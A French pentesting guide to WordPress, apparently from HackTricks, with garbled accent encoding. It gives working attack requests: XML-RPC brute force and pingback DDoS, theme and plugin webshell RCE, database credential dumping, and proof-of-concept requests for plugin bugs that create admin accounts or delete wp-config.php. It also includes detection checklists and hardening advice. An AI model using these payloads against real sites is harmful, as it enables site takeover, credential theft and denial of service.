# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

- Les fichiers **Uploaded** vont dans : `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Les fichiers de th√®mes se trouvent dans /wp-content/themes/,** donc si vous modifiez du php du th√®me pour obtenir une RCE vous utiliserez probablement ce chemin. Par exemple : En utilisant **theme twentytwelve** vous pouvez **acc√©der** au fichier **404.php** dans : [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Une autre URL utile pourrait √™tre :** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Dans **wp-config.php** vous pouvez trouver le mot de passe root de la base de donn√©es.
- Chemins de login par d√©faut √† v√©rifier : _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Principaux fichiers WordPress**

- `index.php`
- `license.txt` contient des informations utiles comme la version de WordPress install√©e.
- `wp-activate.php` est utilis√© pour le processus d'activation par email lors de la cr√©ation d'un nouveau site WordPress.
- Dossiers de login (peuvent √™tre renomm√©s pour les cacher) :
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` est un fichier repr√©sentant une fonctionnalit√© de WordPress qui permet la transmission de donn√©es via HTTP en tant que m√©canisme de transport et XML comme m√©canisme d'encodage. Ce type de communication a √©t√© remplac√© par le WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Le dossier `wp-content` est le r√©pertoire principal o√π sont stock√©s les plugins et les th√®mes.
- `wp-content/uploads/` est le r√©pertoire o√π sont stock√©s tous les fichiers upload√©s sur la plateforme.
- `wp-includes/` est le r√©pertoire o√π sont stock√©s les fichiers core, tels que certificats, polices, fichiers JavaScript, et widgets.
- `wp-sitemap.xml` Dans les versions de WordPress 5.5 et sup√©rieures, WordPress g√©n√®re un fichier sitemap XML avec tous les posts publics et les types de posts et taxonomies publiquement interrogeables.

Post exploitation

- Le fichier `wp-config.php` contient les informations requises par WordPress pour se connecter √† la base de donn√©es telles que le nom de la base, l'h√¥te de la base, le nom d'utilisateur et le mot de passe, les cl√©s d'authentification et salts, et le pr√©fixe des tables de la base. Ce fichier de configuration peut aussi √™tre utilis√© pour activer le mode DEBUG, ce qui peut √™tre utile pour le troubleshooting.

### Permissions des utilisateurs

- **Administrator**
- **Editor** : Publie et g√®re ses propres posts et ceux des autres
- **Author** : Publie et g√®re ses propres posts
- **Contributor** : R√©dige et g√®re ses posts mais ne peut pas les publier
- **Subscriber** : Parcourt les posts et √©dite son profil

## **Passive Enumeration**

### **Get WordPress version**

V√©rifiez si vous pouvez trouver les fichiers `/license.txt` ou `/readme.html`

Dans le **source code** de la page (exemple depuis [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Fichiers CSS (link)

![](<../../images/image (533).png>)

- Fichiers JavaScript

![](<../../images/image (524).png>)

### Obtenir des plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### R√©cup√©rer les th√®mes
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraire les versions en g√©n√©ral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## √ânum√©ration active

### Plugins and Themes

Vous n'arriverez probablement pas √† trouver tous les Plugins and Themes possibles. Pour les d√©couvrir, vous devrez **effectuer activement un Brute Force** d'une liste de Plugins and Themes (esp√©rons pour nous qu'il existe des outils automatis√©s contenant ces listes).

### Users

- **ID Brute:** Vous obtenez des utilisateurs valides d'un site WordPress en Brute Forcing les IDs des utilisateurs :
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si les r√©ponses sont **200** ou **30X**, cela signifie que l'id est **valide**. Si la r√©ponse est **400**, alors l'id est **invalide**.

- **wp-json:** Vous pouvez aussi essayer d'obtenir des informations sur les utilisateurs en interrogeant :
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Un autre endpoint `/wp-json/` qui peut r√©v√©ler certaines informations sur les utilisateurs est :
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Notez que cet endpoint n'expose que les utilisateurs qui ont publi√© un post. **Seules les informations concernant les utilisateurs qui ont cette fonctionnalit√© activ√©e seront fournies**.

Notez aussi que **/wp-json/wp/v2/pages** pourrait leak des adresses IP.

- **Login username enumeration** : Lors de la connexion via **`/wp-login.php`**, le **message** est **diff√©rent** selon qu'il indique que le **username** existe ou non.

### XML-RPC

Si `xml-rpc.php` est actif, vous pouvez effectuer un brute-force de credentials ou l'utiliser pour lancer des attaques DoS vers d'autres ressources. (Vous pouvez automatiser ce processus[ using this](https://github.com/relarizky/wpxploit) par exemple).

Pour v√©rifier s'il est actif, essayez d'acc√©der √† _**/xmlrpc.php**_ et envoyez cette requ√™te :

**V√©rifier**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** sont quelques-unes des m√©thodes pouvant √™tre utilis√©es pour brute-force credentials. Si vous en trouvez une, vous pouvez envoyer quelque chose comme :
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Le message _"Incorrect username or password"_ dans une r√©ponse avec code 200 devrait appara√Ætre si les identifiants ne sont pas valides.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Avec les bons identifiants vous pouvez t√©l√©verser un fichier. Dans la r√©ponse le chemin appara√Ætra ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Il existe aussi une **m√©thode plus rapide** pour brute-force des credentials en utilisant **`system.multicall`**, car vous pouvez essayer plusieurs credentials dans une seule requ√™te :

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Cette m√©thode est destin√©e aux programmes et non aux humains, et est ancienne, donc elle ne supporte pas la 2FA. Donc, si vous avez des creds valides mais que l'acc√®s principal est prot√©g√© par la 2FA, **vous pourriez √™tre capable d'abuser de xmlrpc.php pour vous connecter avec ces creds en contournant la 2FA**. Notez que vous ne pourrez pas effectuer toutes les actions disponibles via la console, mais vous pourriez quand m√™me obtenir une RCE comme l'explique Ippsec dans [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Si vous trouvez la m√©thode _**pingback.ping**_ dans la liste vous pouvez faire en sorte que Wordpress envoie une requ√™te arbitraire √† n'importe quel host/port.\
Cela peut √™tre utilis√© pour demander √† **des milliers** de **sites** Wordpress d'**acc√©der** √† un **m√™me emplacement** (causant ainsi un **DDoS** √† cet endroit) ou vous pouvez l'utiliser pour faire **Wordpress** **scan** un **r√©seau** interne (vous pouvez indiquer n'importe quel port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si vous obtenez **faultCode** avec une valeur **sup√©rieure** √† **0** (17), cela signifie que le port est ouvert.

Consultez l'utilisation de **`system.multicall`** dans la section pr√©c√©dente pour apprendre comment abuser de cette m√©thode afin de provoquer un DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ce fichier existe g√©n√©ralement √† la racine du site Wordpress : **`/wp-cron.php`**\
Lorsque ce fichier est **accessed**, une requ√™te MySQL **heavy** est ex√©cut√©e, il peut donc √™tre utilis√© par des **attackers** pour **cause** un **DoS**.\
De plus, par d√©faut, le `wp-cron.php` est appel√© √† chaque chargement de page (anytime a client requests any Wordpress page), ce qui, sur des sites high-traffic, peut causer des probl√®mes (DoS).

Il est recommand√© de d√©sactiver Wp-Cron et de cr√©er un v√©ritable cronjob sur l'h√¥te qui ex√©cutera les actions n√©cessaires √† des intervalles r√©guliers (without causing issues).

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ et le site Wordpress peut effectuer une requ√™te vers vous.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Cet outil v√©rifie si le **methodName: pingback.ping** et le chemin **/wp-json/oembed/1.0/proxy** existent, et si c'est le cas, il tente de les exploiter.

## Outils automatiques
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obtenir l'acc√®s en modifiant un bit

Plus une curiosit√© qu'une vraie attaque. Dans le CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) vous pouviez inverser 1 bit dans n'importe quel fichier wordpress. Ainsi vous pouviez inverser la position `5389` du fichier `/var/www/html/wp-includes/user.php` pour NOP l'op√©ration NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modification d'un php du th√®me utilis√© (identifiants admin n√©cessaires)**

Apparence ‚Üí √âditeur de th√®me ‚Üí Mod√®le 404 (√† droite)

Remplacez le contenu par un php shell :

![](<../../images/image (384).png>)

Cherchez sur Internet comment acc√©der √† la page mise √† jour. Dans ce cas, vous devez acc√©der ici : [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Vous pouvez utiliser :
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
pour obtenir une session.

## Plugin RCE

### PHP plugin

Il peut √™tre possible de t√©l√©verser des fichiers .php en tant que plugin.\
Cr√©ez votre backdoor php en utilisant par exemple :

![](<../../images/image (183).png>)

Puis ajoutez un nouveau plugin :

![](<../../images/image (722).png>)

T√©l√©versez le plugin et appuyez sur Install Now :

![](<../../images/image (249).png>)

Cliquez sur Procced :

![](<../../images/image (70).png>)

Probablement cela n'affichera rien apparemment, mais si vous allez dans Media, vous verrez votre shell t√©l√©vers√© :

![](<../../images/image (462).png>)

Acc√©dez-y et vous verrez l'URL pour ex√©cuter le reverse shell :

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Cette m√©thode implique l'installation d'un plugin malveillant connu pour √™tre vuln√©rable et pouvant √™tre exploit√© pour obtenir un web shell. Ce processus est r√©alis√© via le WordPress dashboard comme suit :

1. **Acquisition du plugin**: Le plugin est obtenu depuis une source comme Exploit DB, par exemple [**here**](https://www.exploit-db.com/exploits/36374).
2. **Installation du plugin**:
- Allez dans le WordPress dashboard, puis allez √† `Dashboard > Plugins > Upload Plugin`.
- T√©l√©versez le fichier zip du plugin t√©l√©charg√©.
3. **Activation du plugin**: Une fois le plugin install√© avec succ√®s, il doit √™tre activ√© via le dashboard.
4. **Exploitation**:
- Avec le plugin "reflex-gallery" install√© et activ√©, il peut √™tre exploit√© car il est connu pour √™tre vuln√©rable.
- Le framework Metasploit fournit un exploit pour cette vuln√©rabilit√©. En chargeant le module appropri√© et en ex√©cutant des commandes sp√©cifiques, une session meterpreter peut √™tre √©tablie, accordant un acc√®s non autoris√© au site.
- Il est not√© qu'il s'agit juste d'une des nombreuses m√©thodes pour exploiter un site WordPress.

Le contenu inclut des aides visuelles d√©crivant les √©tapes dans le WordPress dashboard pour l'installation et l'activation du plugin. Cependant, il est important de noter qu'exploiter des vuln√©rabilit√©s de cette mani√®re est ill√©gal et contraire √† l'√©thique sans autorisation appropri√©e. Ces informations doivent √™tre utilis√©es de mani√®re responsable et uniquement dans un contexte l√©gal, comme des tests d'intrusion avec permission explicite.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS √† RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ est un script con√ßu pour escalader une vuln√©rabilit√© de **Cross-Site Scripting (XSS)** vers **Remote Code Execution (RCE)** ou d'autres vuln√©rabilit√©s critiques dans WordPress. Pour plus d'infos consultez [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Il prend en charge les versions de WordPress 6.X.X, 5.X.X et 4.X.X et permet de :
- _**Privilege Escalation:**_ Cr√©e un utilisateur dans WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ T√©l√©versez votre plugin personnalis√© (backdoor) sur WordPress.
- _**(RCE) Built-In Plugin Edit:**_ √âditer un plugin int√©gr√© dans WordPress.
- _**(RCE) Built-In Theme Edit:**_ √âditer un th√®me int√©gr√© dans WordPress.
- _**(Custom) Custom Exploits:**_ Exploits personnalis√©s pour des plugins/th√®mes WordPress tiers.

## Post Exploitation

Extraire les noms d'utilisateur et les mots de passe :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Changer le mot de passe admin :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest des plugins Wordpress

### Surface d'attaque

Comprendre comment un plugin Wordpress peut exposer des fonctionnalit√©s est essentiel pour trouver des vuln√©rabilit√©s. Vous pouvez trouver comment un plugin pourrait exposer des fonctionnalit√©s dans les points suivants et quelques exemples de plugins vuln√©rables dans [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

L'un des moyens pour un plugin d'exposer des fonctions aux utilisateurs est via des gestionnaires AJAX. Ceux-ci peuvent contenir des bugs de logique, d'autorisation ou d'authentification. De plus, il est assez fr√©quent que ces fonctions basent √† la fois l'authentification et l'autorisation sur l'existence d'un nonce Wordpress que **tout utilisateur authentifi√© sur l'instance Wordpress pourrait poss√©der** (ind√©pendamment de son r√¥le).

Voici les fonctions qui peuvent √™tre utilis√©es pour exposer une fonction dans un plugin :
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**L'utilisation de `nopriv` rend l'endpoint accessible √† tous les utilisateurs (m√™me les utilisateurs non authentifi√©s).**

> [!CAUTION]
> De plus, si la fonction v√©rifie seulement l'autorisation de l'utilisateur avec la fonction `wp_verify_nonce`, cette fonction v√©rifie uniquement que l'utilisateur est connect√©, elle ne v√©rifie g√©n√©ralement pas le r√¥le de l'utilisateur. Donc des utilisateurs peu privil√©gi√©s pourraient avoir acc√®s √† des actions r√©serv√©es aux utilisateurs √† privil√®ges √©lev√©s.

- **REST API**

Il est √©galement possible d'exposer des fonctions de wordpress en enregistrant une REST API en utilisant la fonction `register_rest_route` :
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Le `permission_callback` est une fonction de rappel qui v√©rifie si un utilisateur donn√© est autoris√© √† appeler la m√©thode API.

**Si la fonction int√©gr√©e `__return_true` est utilis√©e, elle contournera simplement la v√©rification des permissions utilisateur.**

- **Acc√®s direct au fichier php**

Bien s√ªr, Wordpress utilise PHP et les fichiers √† l'int√©rieur des plugins sont directement accessibles depuis le web. Donc, si un plugin expose une fonctionnalit√© vuln√©rable qui est d√©clench√©e simplement en acc√©dant au fichier, cela sera exploitable par n'importe quel utilisateur.

### Usurpation REST via trusted-header (WooCommerce Payments ‚â§ 5.6.1)

Certains plugins impl√©mentent des raccourcis ‚Äútrusted header‚Äù pour des int√©grations internes ou des reverse proxies, puis utilisent cet en-t√™te pour d√©finir le contexte utilisateur courant pour les requ√™tes REST. Si l'en-t√™te n'est pas li√© cryptographiquement √† la requ√™te par un composant en amont, un attaquant peut le falsifier et atteindre des routes REST privil√©gi√©es en tant qu'administrateur.

- Impact : √©l√©vation de privil√®ges non authentifi√©e jusqu'au r√¥le admin en cr√©ant un nouvel administrateur via la core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (force l'ID utilisateur 1, typiquement le premier compte administrateur).
- Route exploit√©e : `POST /wp-json/wp/v2/users` avec un tableau de r√¥le √©lev√©.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Pourquoi cela fonctionne

- Le plugin mappe un header contr√¥l√© par le client √† l'√©tat d'authentification et saute les capability checks.
- WordPress core attend la capability `create_users` pour cette route ; le hack du plugin la bypass en d√©finissant directement le contexte de l'utilisateur courant √† partir du header.

Expected success indicators

- HTTP 201 avec un body JSON d√©crivant l'utilisateur cr√©√©.
- Un nouvel utilisateur admin visible dans `wp-admin/users.php`.

Detection checklist

- Grep pour `getallheaders()`, `$_SERVER['HTTP_...']`, ou des vendor SDKs qui lisent des headers custom pour d√©finir le contexte utilisateur (par ex., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revoir les REST registrations pour des callbacks privil√©gi√©s qui n'ont pas de v√©rifications robustes de `permission_callback` et qui se fient √† la place aux headers de la requ√™te.
- Chercher les usages des fonctions core de gestion d'utilisateurs (`wp_insert_user`, `wp_create_user`) dans des handlers REST qui sont prot√©g√©s uniquement par des valeurs de header.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes et plugins exposent fr√©quemment des AJAX handlers via les hooks `wp_ajax_` et `wp_ajax_nopriv_`. Quand la variante **_nopriv_** est utilis√©e **le callback devient accessible aux visiteurs non authentifi√©s**, donc toute action sensible doit en plus impl√©menter :

1. Un **capability check** (par ex. `current_user_can()` ou au minimum `is_user_logged_in()`), et
2. Un **CSRF nonce** valid√© avec `check_ajax_referer()` / `wp_verify_nonce()`, et
3. **Assainissement / validation stricte des entr√©es**.

Le th√®me multipurpose Litho (< 3.1) a oubli√© ces 3 contr√¥les dans la fonctionnalit√© *Remove Font Family* et a fini par livrer le code suivant (simplifi√©) :
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Probl√®mes introduits par cet extrait :

* **Acc√®s non authentifi√©** ‚Äì le `wp_ajax_nopriv_` hook est enregistr√©.
* **Pas de v√©rification du nonce / capability** ‚Äì n'importe quel visiteur peut atteindre l'endpoint.
* **Pas de sanitisation du chemin** ‚Äì la cha√Æne contr√¥l√©e par l'utilisateur `fontfamily` est concat√©n√©e √† un chemin du syst√®me de fichiers sans filtrage, permettant le classique parcours `../../`.

#### Exploitation

Un attaquant peut supprimer n'importe quel fichier ou r√©pertoire **sous le r√©pertoire de base des uploads** (normalement `<wp-root>/wp-content/uploads/`) en envoyant une seule requ√™te HTTP POST :
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Parce que `wp-config.php` se trouve en dehors de *uploads*, quatre s√©quences `../` suffisent sur une installation par d√©faut. La suppression de `wp-config.php` force WordPress √† lancer l'*assistant d'installation* lors de la visite suivante, permettant une prise de contr√¥le compl√®te du site (l'attaquant fournit simplement une nouvelle configuration DB et cr√©e un utilisateur admin).

D'autres cibles impactantes incluent les fichiers `.php` de plugins/themes (pour neutraliser des plugins de s√©curit√©) ou les r√®gles `.htaccess`.

#### Checklist de d√©tection

* Tout callback `add_action( 'wp_ajax_nopriv_...')` qui appelle des fonctions d'acc√®s au syst√®me de fichiers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concat√©nation d'entr√©es utilisateur non assainies dans des chemins (rechercher `$_POST`, `$_GET`, `$_REQUEST`).
* Absence de `check_ajax_referer()` et de `current_user_can()`/`is_user_logged_in()`.

---

### Escalade de privil√®ges via restauration de r√¥le obsol√®te et absence d'autorisation (ASE "View Admin as Role")

Beaucoup de plugins impl√©mentent une fonctionnalit√© "view as role" ou de changement temporaire de r√¥le en sauvegardant le(s) r√¥le(s) original(aux) dans les user meta afin de pouvoir les restaurer plus tard. Si le chemin de restauration s'appuie uniquement sur des param√®tres de requ√™te (par ex. `$_REQUEST['reset-for']`) et sur une liste maintenue par le plugin sans v√©rifier les capabilities et un nonce valide, cela devient une escalade verticale de privil√®ges.

Un exemple r√©el a √©t√© trouv√© dans le plugin Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). La branche de reset restaurait les r√¥les bas√©s sur `reset-for=<username>` si le nom d'utilisateur apparaissait dans un tableau interne `$options['viewing_admin_as_role_are']`, mais n'effectuait ni v√©rification `current_user_can()` ni v√©rification de nonce avant de supprimer les r√¥les actuels et de r√©ajouter les r√¥les sauvegard√©s dans les user meta `_asenha_view_admin_as_original_roles` :
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Pourquoi c'est exploitable

- Se fie √† `$_REQUEST['reset-for']` et √† une option du plugin sans autorisation c√¥t√© serveur.
- Si un utilisateur avait auparavant des privil√®ges plus √©lev√©s enregistr√©s dans `_asenha_view_admin_as_original_roles` et a √©t√© r√©trograd√©, il peut les restaurer en acc√©dant au chemin de reset.
- Dans certains d√©ploiements, tout utilisateur authentifi√© pouvait d√©clencher un reset pour un autre nom d'utilisateur encore pr√©sent dans `viewing_admin_as_role_are` (autorisation d√©faillante).

Exploitation (exemple)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Sur les builds vuln√©rables, cela supprime les r√¥les actuels et r√©-ajoute les r√¥les originaux sauvegard√©s (par ex., `administrator`), escaladant ainsi les privil√®ges.

Detection checklist

- Recherchez des fonctionnalit√©s de changement de r√¥le qui conservent les ‚Äúoriginal roles‚Äù dans le user meta (par ex., `_asenha_view_admin_as_original_roles`).
- Identifier les chemins de reset/restore qui :
- Lisent des noms d'utilisateur depuis `$_REQUEST` / `$_GET` / `$_POST`.
- Modifient les r√¥les via `add_role()` / `remove_role()` sans `current_user_can()` et `wp_verify_nonce()` / `check_admin_referer()`.
- Autorisent sur la base d'un tableau d'options de plugin (par ex., `viewing_admin_as_role_are`) au lieu des capacit√©s de l'acteur.

---

### Unauthenticated privilege escalation via cookie‚Äëtrusted user switching on public init (Service Finder ‚Äúsf-booking‚Äù)

Certains plugins raccordent des helpers de changement d'utilisateur au hook public `init` et d√©rivent l'identit√© d'un cookie contr√¥l√© par le client. Si le code appelle `wp_set_auth_cookie()` sans v√©rifier l'authentification, la capability et un nonce valide, tout visiteur non authentifi√© peut forcer la connexion en tant qu'ID utilisateur arbitraire.

Typical vulnerable pattern (simplified from Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Pourquoi c'est exploitable

- Le hook public `init` rend le handler accessible aux utilisateurs non authentifi√©s (pas de garde `is_user_logged_in()`).
- L'identit√© est d√©riv√©e d'un cookie modifiable par le client (`original_user_id`).
- Un appel direct √† `wp_set_auth_cookie($uid)` connecte le requ√©rant en tant que cet utilisateur sans aucune v√©rification de capability/nonce.

Exploitation (sans authentification)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Consid√©rations WAF pour les CVE de WordPress/plugin

Les WAF g√©n√©riques pour edge/serveur sont configur√©s pour des motifs larges (SQLi, XSS, LFI). De nombreuses vuln√©rabilit√©s WordPress/plugin √† fort impact sont des bugs de logique/authentification sp√©cifiques √† l'application qui ressemblent √† du trafic b√©nin √† moins que le moteur ne comprenne les routes WordPress et la s√©mantique des plugins.

Offensive notes

- Ciblez les endpoints sp√©cifiques aux plugins avec des payloads propres : `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, gestionnaires de fichiers personnalis√©s, shortcodes.
- Testez d'abord les chemins non authentifi√©s (AJAX `nopriv`, REST avec permissive `permission_callback`, shortcodes publics). Les payloads par d√©faut r√©ussissent souvent sans obfuscation.
- Cas typiques √† fort impact : privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Ne comptez pas sur des signatures WAF g√©n√©riques pour prot√©ger les CVE de plugins. Mettez en place des correctifs virtuels sp√©cifiques √† la vuln√©rabilit√© au niveau applicatif ou mettez √† jour rapidement.
- Privil√©giez des contr√¥les en mode s√©curit√© positive dans le code (capabilities, nonces, validation stricte des entr√©es) plut√¥t que des filtres n√©gatifs bas√©s sur des regex.

## Protection de WordPress

### Mises √† jour r√©guli√®res

Assurez-vous que WordPress, les plugins et les th√®mes sont √† jour. V√©rifiez aussi que la mise √† jour automatique est activ√©e dans wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
De plus, n'installez **que des plugins et th√®mes WordPress fiables**.

### Plugins de s√©curit√©

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Autres recommandations**

- Supprimez l'utilisateur par d√©faut **admin**
- Utilisez des **mots de passe forts** et **2FA**
- P√©riodiquement **revoyez** les **autorisations** des utilisateurs
- **Limitez les tentatives de connexion** pour pr√©venir les attaques Brute Force
- Renommez le fichier **`wp-admin.php`** et n'autorisez l'acc√®s qu'en interne ou depuis certaines adresses IP.


